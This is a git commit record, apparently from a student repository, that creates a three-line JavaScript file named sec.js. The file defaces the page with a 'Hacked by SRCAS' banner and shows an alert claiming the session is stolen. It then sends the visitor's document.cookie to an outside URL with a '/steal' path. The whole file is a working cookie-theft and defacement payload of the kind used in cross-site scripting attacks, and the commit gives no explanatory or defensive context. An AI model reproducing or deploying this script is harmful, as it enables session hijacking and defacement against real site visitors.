d47233127d4fb3f4c5f02f769e4cef8cb2705b38
Nagarjun04 <137464253+Nagarjun04@users.noreply.github.com>
2025-02-14 18:42:03 +0530

    Create sec.js

---
+++ sec.js
@@ -0,0 +1,3 @@
+document.body.innerHTML += '<h1 style="color:red;">Hacked by SRCAS</h1>';
+alert("Your session is stolen!");
+fetch('https://srcas.ac.in/steal?cookie=' + encodeURIComponent(document.cookie));
